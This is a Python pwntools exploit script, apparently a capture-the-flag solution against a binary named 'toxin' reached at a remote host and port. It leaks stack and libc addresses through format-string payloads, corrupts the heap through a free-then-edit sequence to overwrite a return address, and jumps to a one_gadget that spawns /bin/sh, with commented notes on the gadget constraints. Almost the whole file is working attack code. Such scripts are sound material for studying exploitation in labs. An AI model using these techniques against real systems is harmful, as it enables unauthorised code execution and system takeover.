#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './toxin'
elf = context.binary = ELF(exe, checksec=True)
libc = './lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
host, port = '159.65.52.96', 30613

def start(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *search_toxin+213
'''.format(**locals())

def add_toxin(size, index, payload):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'length:', str(size).encode())
    io.sendlineafter(b'index:', str(index).encode())
    io.sendlineafter(b'formula:', payload)

def edit_toxin(index, payload):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'index:', str(index).encode())
    io.sendlineafter(b'formula:', payload)

def drink_toxin(index):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'index:', str(index).encode())

def search_toxin(payload):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'term:', payload.encode())
    return int(io.recvline()[:-1].decode(), 16)

# =========================================================
#                         FUZZING
# =========================================================
# io = start()

# for i in range(1, 20):
#     info("leak: %#s", search_toxin(f'%{i}$p'))

# io.close()

# =========================================================
#                         EXPLOITS
# =========================================================
io = start()

offset = -14
stack_leak = search_toxin('%1$p')
choice_4_rip = stack_leak - offset
info("rip: %#x", choice_4_rip)

offset = 17
read_libc_leak = search_toxin('%3$p')
libc.address = (read_libc_leak - offset) - libc.sym['read']
info("libc base: %#x", libc.address)

add_toxin(0x10, 0, b'AAAA')
drink_toxin(0)
edit_toxin(0, flat(choice_4_rip))

# ONE_GADGET
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

add_toxin(0x10, 1, b'AAAA')
add_toxin(0x10, 2, flat(libc.address + 0x4f322))

io.interactive()